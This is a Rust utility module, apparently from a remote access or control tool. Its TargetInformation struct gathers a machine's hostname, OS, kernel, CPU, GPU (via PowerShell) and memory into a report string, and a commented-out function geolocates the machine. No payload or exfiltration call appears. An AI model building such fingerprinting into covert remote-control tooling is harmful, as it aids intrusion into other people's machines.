use std::process::Command;

use sysinfo::System;

pub fn is_valid_ip(ip: &str) -> bool {
    if ip == "localhost" {
        return true;
    }
    ip.split('.').filter_map(|s| s.parse::<u8>().ok()).count() == 4 && !ip.contains("..")
}

pub fn is_port_valid(port: &str) -> bool {
    (0..=65535).contains(&port.parse::<i32>().unwrap())
}

#[macro_export]
macro_rules! dev_print {
    ($($arg:tt)*) => {
        #[cfg(feature = "dev-logs")]
        println!($($arg)*);
    }
}
#[macro_export]
macro_rules! dev_eprint {
    ($($arg:tt)*) => {
        #[cfg(feature = "dev-logs")]
        eprintln!($($arg)*);
    }
}

#[derive(Clone)]
pub struct Connection {
    pub ip: String,
    pub port: i32,
}
impl Connection {
    pub fn from(ip: String, port: i32) -> Self {
        Self { ip, port }
    }
}

pub struct TargetInformation {
    host_name: String,
    os_version: String,
    long_os_version: String,
    kernel_version: String,
    cpu_model: String,
    gpu_models: Vec<String>,
    memory_total: u64,
    // geo_data: Option<String>,
}

impl TargetInformation {
    pub fn get() -> TargetInformation {
        let mut sys = System::new_all();
        sys.refresh_all();

        TargetInformation {
            host_name: System::host_name().unwrap_or("Unknown".into()),
            os_version: System::os_version().unwrap_or("Unknown".into()),
            long_os_version: System::long_os_version().unwrap_or("Unknown".into()),
            kernel_version: System::kernel_version().unwrap_or("Unknown".into()),
            cpu_model: sys.cpus()[0].brand().to_string().trim().to_string(),
            gpu_models: get_gpu_models(),
            memory_total: sys.total_memory(),
            // geo_data: get_ip_location(),
        }
    }

    /* Expected format
       "HostName, OS short, OS Long, Kernel Version, CPU Model, {GPU Model 1, GPU Model 2}, Total Memory"
    */

    pub fn to_string(&self) -> String {
        let gpus = format!("{{{}}}", self.gpu_models.join(", "));
        format!(
            "{}, {}, {}, {}, {}, {}, {}",
            self.host_name,
            self.os_version,
            self.long_os_version,
            self.kernel_version,
            self.cpu_model,
            gpus,
            self.memory_total,
        )
    }
}

fn get_gpu_models() -> Vec<String> {
    let output = Command::new("powershell")
        .args(["-Command", "(Get-WmiObject Win32_VideoController).Name"])
        .output();

    if let Ok(output) = output {
        let output_str = String::from_utf8_lossy(&output.stdout);
        output_str.lines().map(|s| s.trim().to_string()).collect()
    } else {
        vec!["Unknown".to_string()]
    }
}

// fn get_ip_location() -> Option<String> {
//     let client = reqwest::blocking::Client::new();
//     let response = client.get("http://ip-api.com/json").send();

//     if let Ok(resp) = response {
//         if let Ok(location) = resp.json::<IpApiLocation>() {
//             let lat = location.lat.unwrap_or(0.0);
//             let lon = location.lon.unwrap_or(0.0);
//             return Some(format!("{}, {}", lat, lon));
//         }
//     }
//     None
// }
